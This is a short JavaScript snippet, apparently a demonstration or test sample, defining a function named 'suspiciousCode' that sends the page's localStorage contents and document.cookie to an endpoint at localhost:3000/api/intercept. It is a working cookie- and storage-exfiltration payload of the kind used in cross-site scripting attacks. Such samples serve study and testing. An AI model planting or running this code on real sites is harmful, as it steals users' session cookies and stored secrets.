window.suspiciousCode = () => {
  const url = "http://localhost:3000/api/intercept"
  fetch(url, {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ 
      storage: window.localStorage,
      cookie: document.cookie
    })
  })
}
